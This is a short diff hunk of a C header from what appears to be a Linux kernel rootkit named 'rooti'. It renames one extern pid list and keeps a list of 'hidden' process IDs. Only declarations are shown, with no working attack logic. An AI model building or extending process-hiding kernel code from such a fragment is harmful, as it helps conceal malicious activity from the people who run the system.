@@ -6,7 +6,7 @@
 #include <linux/rculist.h>
 
 extern struct list_head rooti_hidden_pids;
-extern struct list_head rooti_lifetime_bound_pids;
+extern struct list_head rooti_sticky_pids;
 
 struct rooti_pid_list_head {
     pid_t pid;
